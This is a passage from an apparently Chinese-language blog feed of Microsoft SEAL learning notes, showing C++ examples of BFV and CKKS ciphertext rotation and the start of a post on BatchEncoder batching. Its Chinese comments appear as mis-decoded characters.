number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">3ULL</span><span class="token punctuation">;</span>    pod_matrix<span class="token punctuation">[</span>row_size<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">4ULL</span><span class="token punctuation">;</span>    pod_matrix<span class="token punctuation">[</span>row_size <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">5ULL</span><span class="token punctuation">;</span>    pod_matrix<span class="token punctuation">[</span>row_size <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">6ULL</span><span class="token punctuation">;</span>    pod_matrix<span class="token punctuation">[</span>row_size <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">7ULL</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Input plaintext matrix:"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token function">print_matrix</span><span class="token punctuation">(</span>pod_matrix<span class="token punctuation">,</span> row_size<span class="token punctuation">)</span><span class="token punctuation">;</span>    Plaintext plain_matrix<span class="token punctuation">;</span>    <span class="token function">print_line</span><span class="token punctuation">(</span><span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Encode and encrypt."</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    batch_encoder<span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>pod_matrix<span class="token punctuation">,</span> plain_matrix<span class="token punctuation">)</span><span class="token punctuation">;</span>    Ciphertext encrypted_matrix<span class="token punctuation">;</span>    encryptor<span class="token punctuation">.</span><span class="token function">encrypt</span><span class="token punctuation">(</span>plain_matrix<span class="token punctuation">,</span> encrypted_matrix<span class="token punctuation">)</span><span class="token punctuation">;</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"    + Noise budget in fresh encryption: "</span> <span class="token operator">&lt;&lt;</span> decryptor<span class="token punctuation">.</span><span class="token function">invariant_noise_budget</span><span class="token punctuation">(</span>encrypted_matrix<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" bits"</span>    <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token comment">/*     * æ—‹è½¬è¿˜éœ€è¦å¦ä¸€ç§ç±»å‹çš„ç‰¹æ®Šé”® Galois keys    */</span>    GaloisKeys galois_keys<span class="token punctuation">;</span>    keygen<span class="token punctuation">.</span><span class="token function">create_galois_keys</span><span class="token punctuation">(</span>galois_keys<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/*    ç°åœ¨å°†çŸ©é˜µè¡Œå‘å·¦å¾ªç¯ç§»åŠ¨3æ­¥, è§£å¯†ã€è§£ç å’Œæ‰“å°    */</span>    <span class="token function">print_line</span><span class="token punctuation">(</span><span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Rotate rows 3 steps left."</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    evaluator<span class="token punctuation">.</span><span class="token function">rotate_rows_inplace</span><span class="token punctuation">(</span>encrypted_matrix<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> galois_keys<span class="token punctuation">)</span><span class="token punctuation">;</span>    Plaintext plain_result<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"    + Noise budget after rotation: "</span> <span class="token operator">&lt;&lt;</span> decryptor<span class="token punctuation">.</span><span class="token function">invariant_noise_budget</span><span class="token punctuation">(</span>encrypted_matrix<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" bits"</span>        <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"    + Decrypt and decode ...... Correct."</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    decryptor<span class="token punctuation">.</span><span class="token function">decrypt</span><span class="token punctuation">(</span>encrypted_matrix<span class="token punctuation">,</span> plain_result<span class="token punctuation">)</span><span class="token punctuation">;</span>    batch_encoder<span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>plain_result<span class="token punctuation">,</span> pod_matrix<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">print_matrix</span><span class="token punctuation">(</span>pod_matrix<span class="token punctuation">,</span> row_size<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/*    æˆ‘ä»¬ä¹Ÿå¯ä»¥æ—‹è½¬åˆ—, i.e., äº¤æ¢è¡Œ.    */</span>    <span class="token function">print_line</span><span class="token punctuation">(</span><span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Rotate columns."</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    evaluator<span class="token punctuation">.</span><span class="token function">rotate_columns_inplace</span><span class="token punctuation">(</span>encrypted_matrix<span class="token punctuation">,</span> galois_keys<span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"    + Noise budget after rotation: "</span> <span class="token operator">&lt;&lt;</span> decryptor<span class="token punctuation">.</span><span class="token function">invariant_noise_budget</span><span class="token punctuation">(</span>encrypted_matrix<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" bits"</span>        <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"    + Decrypt and decode ...... Correct."</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    decryptor<span class="token punctuation">.</span><span class="token function">decrypt</span><span class="token punctuation">(</span>encrypted_matrix<span class="token punctuation">,</span> plain_result<span class="token punctuation">)</span><span class="token punctuation">;</span>    batch_encoder<span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>plain_result<span class="token punctuation">,</span> pod_matrix<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">print_matrix</span><span class="token punctuation">(</span>pod_matrix<span class="token punctuation">,</span> row_size<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/*    æœ€åï¼Œæˆ‘ä»¬å°†è¿™äº›è¡Œå‘å³æ—‹è½¬4æ­¥, decrypt, decode, and print.    */</span>    <span class="token function">print_line</span><span class="token punctuation">(</span><span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Rotate rows 4 steps right."</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    evaluator<span class="token punctuation">.</span><span class="token function">rotate_rows_inplace</span><span class="token punctuation">(</span>encrypted_matrix<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">,</span> galois_keys<span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"    + Noise budget after rotation: "</span> <span class="token operator">&lt;&lt;</span> decryptor<span class="token punctuation">.</span><span class="token function">invariant_noise_budget</span><span class="token punctuation">(</span>encrypted_matrix<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" bits"</span>        <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"    + Decrypt and decode ...... Correct."</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    decryptor<span class="token punctuation">.</span><span class="token function">decrypt</span><span class="token punctuation">(</span>encrypted_matrix<span class="token punctuation">,</span> plain_result<span class="token punctuation">)</span><span class="token punctuation">;</span>    batch_encoder<span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>plain_result<span class="token punctuation">,</span> pod_matrix<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">print_matrix</span><span class="token punctuation">(</span>pod_matrix<span class="token punctuation">,</span> row_size<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">example_rotation_ckks</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">print_example_banner</span><span class="token punctuation">(</span><span class="token string">"Example: Rotation / Rotation in CKKS"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/*    Rotations in the CKKS scheme work very similarly to rotations in BFV.    */</span>    EncryptionParameters <span class="token function">parms</span><span class="token punctuation">(</span>scheme_type<span class="token operator">::</span>ckks<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">size_t</span> poly_modulus_degree <span class="token operator">=</span> <span class="token number">8192</span><span class="token punctuation">;</span>    parms<span class="token punctuation">.</span><span class="token function">set_poly_modulus_degree</span><span class="token punctuation">(</span>poly_modulus_degree<span class="token punctuation">)</span><span class="token punctuation">;</span>    parms<span class="token punctuation">.</span><span class="token function">set_coeff_modulus</span><span class="token punctuation">(</span>CoeffModulus<span class="token operator">::</span><span class="token function">Create</span><span class="token punctuation">(</span>poly_modulus_degree<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">40</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    SEALContext <span class="token function">context</span><span class="token punctuation">(</span>parms<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">print_parameters</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    KeyGenerator <span class="token function">keygen</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span>    SecretKey secret_key <span class="token operator">=</span> keygen<span class="token punctuation">.</span><span class="token function">secret_key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    PublicKey public_key<span class="token punctuation">;</span>    keygen<span class="token punctuation">.</span><span class="token function">create_public_key</span><span class="token punctuation">(</span>public_key<span class="token punctuation">)</span><span class="token punctuation">;</span>    RelinKeys relin_keys<span class="token punctuation">;</span>    keygen<span class="token punctuation">.</span><span class="token function">create_relin_keys</span><span class="token punctuation">(</span>relin_keys<span class="token punctuation">)</span><span class="token punctuation">;</span>    GaloisKeys galois_keys<span class="token punctuation">;</span>    keygen<span class="token punctuation">.</span><span class="token function">create_galois_keys</span><span class="token punctuation">(</span>galois_keys<span class="token punctuation">)</span><span class="token punctuation">;</span>    Encryptor <span class="token function">encryptor</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span> public_key<span class="token punctuation">)</span><span class="token punctuation">;</span>    Evaluator <span class="token function">evaluator</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span>    Decryptor <span class="token function">decryptor</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span> secret_key<span class="token punctuation">)</span><span class="token punctuation">;</span>    CKKSEncoder <span class="token function">ckks_encoder</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">size_t</span> slot_count <span class="token operator">=</span> ckks_encoder<span class="token punctuation">.</span><span class="token function">slot_count</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Number of slots: "</span> <span class="token operator">&lt;&lt;</span> slot_count <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    vector<span class="token operator">&lt;</span><span class="token keyword">double</span><span class="token operator">></span> input<span class="token punctuation">;</span>    input<span class="token punctuation">.</span><span class="token function">reserve</span><span class="token punctuation">(</span>slot_count<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">double</span> curr_point <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">double</span> step_size <span class="token operator">=</span> <span class="token number">1.0</span> <span class="token operator">/</span> <span class="token punctuation">(</span>static_cast<span class="token operator">&lt;</span><span class="token keyword">double</span><span class="token operator">></span><span class="token punctuation">(</span>slot_count<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> slot_count<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">,</span> curr_point <span class="token operator">+=</span> step_size<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        input<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>curr_point<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Input vector:"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token function">print_vector</span><span class="token punctuation">(</span>input<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">auto</span> scale <span class="token operator">=</span> <span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">2.0</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">print_line</span><span class="token punctuation">(</span><span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Encode and encrypt."</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    Plaintext plain<span class="token punctuation">;</span>    ckks_encoder<span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>input<span class="token punctuation">,</span> scale<span class="token punctuation">,</span> plain<span class="token punctuation">)</span><span class="token punctuation">;</span>    Ciphertext encrypted<span class="token punctuation">;</span>    encryptor<span class="token punctuation">.</span><span class="token function">encrypt</span><span class="token punctuation">(</span>plain<span class="token punctuation">,</span> encrypted<span class="token punctuation">)</span><span class="token punctuation">;</span>    Ciphertext rotated<span class="token punctuation">;</span>    <span class="token function">print_line</span><span class="token punctuation">(</span><span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Rotate 2 steps left."</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    evaluator<span class="token punctuation">.</span><span class="token function">rotate_vector</span><span class="token punctuation">(</span>encrypted<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> galois_keys<span class="token punctuation">,</span> rotated<span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"    + Decrypt and decode ...... Correct."</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    decryptor<span class="token punctuation">.</span><span class="token function">decrypt</span><span class="token punctuation">(</span>rotated<span class="token punctuation">,</span> plain<span class="token punctuation">)</span><span class="token punctuation">;</span>    vector<span class="token operator">&lt;</span><span class="token keyword">double</span><span class="token operator">></span> result<span class="token punctuation">;</span>    ckks_encoder<span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>plain<span class="token punctuation">,</span> result<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">print_vector</span><span class="token punctuation">(</span>result<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">print_line</span><span class="token punctuation">(</span><span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Rotate 2 steps right."</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    evaluator<span class="token punctuation">.</span><span class="token function">rotate_vector</span><span class="token punctuation">(</span>encrypted<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span> galois_keys<span class="token punctuation">,</span> rotated<span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"    + Decrypt and decode ...... Correct."</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    decryptor<span class="token punctuation">.</span><span class="token function">decrypt</span><span class="token punctuation">(</span>rotated<span class="token punctuation">,</span> plain<span class="token punctuation">)</span><span class="token punctuation">;</span>        ckks_encoder<span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>plain<span class="token punctuation">,</span> result<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">print_vector</span><span class="token punctuation">(</span>result<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">example_rotation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">print_example_banner</span><span class="token punctuation">(</span><span class="token string">"Example: Rotation"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/*    Run all rotation examples.    */</span>    <span class="token function">example_rotation_bfv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">example_rotation_ckks</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>              </div>            </details></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> Microsoft SEAL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Seal </tag>
            
            <tag> åŒæ€åŠ å¯† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEALå­¦ä¹ ç¬¬äºŒå¤©-Encoderå¤„ç†</title>
      <link href="/posts/286653df/"/>
      <url>/posts/286653df/</url>
      
        <content type="html"><![CDATA[<blockquote><p>@auther by sizaif</p></blockquote><h1>SEAL å­¦ä¹ ç¬¬äºŒå¤© encoders</h1><p>@[toc]<br>â€‹</p><h2 id="BatchEncoder">BatchEncoder</h2><div class="story post-story"><p>[BatchEncoder] (For BFV scheme only)</p><p>åœ¨â€œ1 _bfv_basicsã€‚æˆ‘ä»¬å±•ç¤ºäº†å¦‚ä½•ä½¿ç”¨BFVæ–¹æ¡ˆæ‰§è¡Œä¸€ä¸ªéå¸¸ç®€å•çš„è®¡ç®—ã€‚è®¡ç®—ä»¥æ˜æ–‡æ¨¡ä¸ºå‚æ•°ï¼Œä»…åˆ©ç”¨ä¸€ä¸ªBFVæ˜æ–‡å¤šé¡¹å¼çš„ç³»æ•°ã€‚è¿™ç§æ–¹æ³•æœ‰ä¸¤ä¸ªå€¼å¾—æ³¨æ„çš„é—®é¢˜:</p><pre class="language-none"><code class="language-none">(1)å®é™…åº”ç”¨ä¸­ä¸€èˆ¬é‡‡ç”¨æ•´æ•°æˆ–å®æ•°ç®—æ³•ï¼Œè€Œä¸æ˜¯æ¨¡è¿ç®—;(2)æˆ‘ä»¬åªä½¿ç”¨äº†æ˜æ–‡å¤šé¡¹å¼çš„ä¸€ä¸ªç³»æ•°ã€‚è¿™æ˜¯éå¸¸æµªè´¹çš„ï¼Œå› ä¸ºæ˜æ–‡å¤šé¡¹å¼å¾ˆå¤§ï¼Œè€Œä¸”åœ¨ä»»ä½•æƒ…å†µä¸‹éƒ½å°†å…¨éƒ¨åŠ å¯†ã€‚</code></pre><p>å¯¹äº(1) è‹¥å¢å¤§plain_modulus ï¼Œè™½ç„¶å¯è¡Œï¼Œä½†åŒæ—¶å¢åŠ äº† å™ªå£°é¢„ç®—çš„æ¶ˆè€—(å½“å™ªå£°é¢„ç®—æ¶ˆè€—åˆ°0æ—¶ï¼Œè®¡ç®—ç»“æœæ˜¯ä¸æ­£ç¡®çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦éšæ—¶å…³æ³¨å™ªå£°é¢„ç®—)ï¼Œ</p><p>å°†æ•°æ®ç¼–ç ä¸ºæ˜æ–‡(plaintext) è¿›è¡Œencoder å…è®¸æ›´å¤šçš„è®¡ç®—è€Œæ²¡æœ‰æ•°æ®ç±»å‹æº¢å‡ºï¼Œè¿˜å¯ä»¥å…è®¸ä½¿ç”¨å®Œæ•´çš„æ˜æ–‡å¤šé¡¹å¼ã€‚</p><table><thead><tr><th>è°ƒç”¨</th><th>å‚æ•°</th><th>è§£é‡Šè¯´æ˜</th></tr></thead><tbody><tr><td>BatchEncoder batch_encoder(context);</td><td>SEALContext</td><td>å£°æ˜ä¸€ä¸ªæ‰¹å¤„ç†ç±»</td></tr><tr><td>batch_encoder.encode(pod_matrix, plain_matrix);</td><td>VectorPlaintext</td><td>å°†ä¸€ä¸ªvectoræ‰¹é‡ç¼–ç æˆæˆæ˜æ–‡Plaintext</td></tr><tr><td>batch_encoder.decode(plain_matrix, pod_result);</td><td>Plaintext,Vector</td><td>å°†ä¸€ä¸ªæ˜æ–‡Plaintextå¤„ç†è§£ç æˆvector</td></tr><tr><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td></tr></tbody></table><pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">/*è®¾Nä¸ºpoly_modulus_degreeï¼ŒTä¸ºplain_modulusã€‚æ‰¹å¤„ç†å…è®¸BFVæ˜æ–‡å¤šé¡¹å¼è¢«è§†ä¸º2Ã—(N/2)çŸ©é˜µï¼Œæ¯ä¸ªå…ƒç´ éƒ½æ˜¯ä¸€ä¸ªæ¨¡Tæ•´æ•°ã€‚åœ¨çŸ©é˜µè§†å›¾ä¸­ï¼ŒåŠ å¯†æ“ä½œåœ¨åŠ å¯†çŸ©é˜µä¸Šé€ä¸ªæ‰§è¡Œelement-wiseï¼Œå…è®¸ç”¨æˆ·åœ¨å®Œå…¨å‘é‡åŒ–è®¡ç®—ä¸­è·å¾—å‡ ä¸ªæ•°é‡çº§çš„é€Ÿåº¦æå‡ã€‚å› æ­¤ï¼Œé™¤äº†æœ€ç®€å•çš„è®¡ç®—ä¹‹å¤–ï¼Œæ‰¹å¤„ç†åº”è¯¥æ˜¯é¦–é€‰çš„æ–¹æ³•ã€‚ä½¿ç”¨BFVæ—¶ï¼Œå¦‚æœä½¿ç”¨å¾—å½“ï¼Œå®ç°çš„æ€§èƒ½å°†è¶…è¿‡ä½¿ç”¨IntegerEncoderå®Œæˆçš„ä»»ä½•å·¥ä½œã€‚*/</span>EncryptionParameters <span class="token function">parms</span><span class="token punctuation">(</span>scheme_type<span class="token operator">::</span>bfv<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">size_t</span> poly_modulus_degree <span class="token operator">=</span> <span class="token number">8192</span><span class="token punctuation">;</span>    parms<span class="token punctuation">.</span><span class="token function">set_poly_modulus_degree</span><span class="token punctuation">(</span>poly_modulus_degree<span class="token punctuation">)</span><span class="token punctuation">;</span>    parms<span class="token punctuation">.</span><span class="token function">set_coeff_modulus</span><span class="token punctuation">(</span>CoeffModulus<span class="token operator">::</span><span class="token function">BFVDefault</span><span class="token punctuation">(</span>poly_modulus_degree<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>è¦å¯ç”¨æ‰¹å¤„ç†ï¼Œæˆ‘ä»¬éœ€è¦å°†plain_modulusè®¾ç½®ä¸ºä¸€ä¸ªç´ æ•°ï¼Œç­‰äº1æ¨¡2* poly_modulus_degreesã€‚Microsoft SEALæä¾›äº†ä¸€ä¸ªåŠ©æ‰‹</p><p>æ‰¾åˆ°è¿™æ ·ä¸€ä¸ªè´¨æ•°çš„æ–¹æ³•ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ª20ä½ç´ æ•°æ”¯æŒæ‰¹å¤„ç†ã€‚</p><p>é€šè¿‡CoeffModulus::BFVDefault(poly_modulus_degree) äº§å‡ºä¸€ä¸ª<strong>ç´ æ•°</strong></p><pre class="language-c" data-language="c"><code class="language-c">parms<span class="token punctuation">.</span><span class="token function">set_plain_modulus</span><span class="token punctuation">(</span>PlainModulus<span class="token operator">::</span><span class="token function">Batching</span><span class="token punctuation">(</span>poly_modulus_degree<span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>SEALContext <span class="token function">context</span><span class="token punctuation">(</span>parms<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// å£°æ˜å®Œcontextåç±»ï¼Œåå°±å¯ä»¥å¼€å§‹ä½¿ç”¨äº†</span><span class="token comment">// æ£€æµ‹æ˜¯å¦æˆåŠŸå¯ç”¨</span><span class="token keyword">auto</span> qualifiers <span class="token operator">=</span> context<span class="token punctuation">.</span><span class="token function">first_context_data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">qualifiers</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Batching enabled: "</span> <span class="token operator">&lt;&lt;</span> boolalpha <span class="token operator">&lt;&lt;</span> qualifiers<span class="token punctuation">.</span>using_batching <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span></code></pre><p>æ‰¹å¤„ç†â€˜slotsâ€™çš„æ€»æ•°ç­‰äºpoly_modulus_degree, Nï¼Œè¿™äº›â€™slotsâ€™è¢«ç»„ç»‡æˆ<a href="**2%C3%97(N/2)**">2Ã—(N/2)</a>çŸ©é˜µï¼Œå¯ä»¥è¢«åŠ å¯†å’Œè®¡ç®—ã€‚æ¯ä¸ªslotå«ä¸€ä¸ªæ•´æ•° MOD plain_modulusã€‚</p><p><strong>2Ã—(N/2)</strong></p><pre class="language-c" data-language="c"><code class="language-c"><span class="token class-name">size_t</span> slot_count <span class="token operator">=</span> batch_encoder<span class="token punctuation">.</span><span class="token function">slot_count</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> row_size <span class="token operator">=</span> slot_count <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Plaintext matrix slot_count size: "</span> <span class="token operator">&lt;&lt;</span> slot_count <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Plaintext matrix row size: "</span> <span class="token operator">&lt;&lt;</span> row_size <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token comment">/** å£°æ˜ä¸€ä¸ªvectorï¼Œé•¿åº¦ä¸ºslot_countï¼Œ é»˜ä¸º 0 * å½¢å¼ä¸ºï¼š 2*(slot_count/2) çš„äºŒç»´çŸ©é˜µ* [0...............row_size]* [row_size......slot_count]*/</span>vector<span class="token operator">&lt;</span><span class="token class-name">uint64_t</span><span class="token operator">></span> <span class="token function">pod_matrix</span><span class="token punctuation">(</span>slot_count<span class="token punctuation">,</span> <span class="token number">0ULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//èµ‹å€¼</span>pod_matrix<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0ULL</span><span class="token punctuation">;</span>pod_matrix<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1ULL</span><span class="token punctuation">;</span>pod_matrix<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">2ULL</span><span class="token punctuation">;</span>pod_matrix<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">3ULL</span><span class="token punctuation">;</span>pod_matrix<span class="token punctuation">[</span>row_size<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">4ULL</span><span class="token punctuation">;</span>pod_matrix<span class="token punctuation">[</span>row_size <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">5ULL</span><span class="token punctuation">;</span>pod_matrix<span class="token punctuation">[</span>row_size <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">6ULL</span><span class="token punctuation">;</span>pod_matrix<span class="token punctuation">[</span>row_size <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">7ULL</span><span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Input plaintext matrix:"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token comment">/** è¿™ä¸ªprint_matrixä¸ä¼šæ‰“å°çŸ©é˜µçš„æ¯ä¸€åˆ—,åªæ‰“å°æ¯ä¸€è¡Œçš„å‰5ä¸ªå’Œæœ€å5ä¸ª* [ 0,  1,  2,  3,  0,  0, ...,  0 ]* [ 4,  5,  6,  7,  0,  0, ...,  0 ]*/</span><span class="token function">print_matrix</span><span class="token 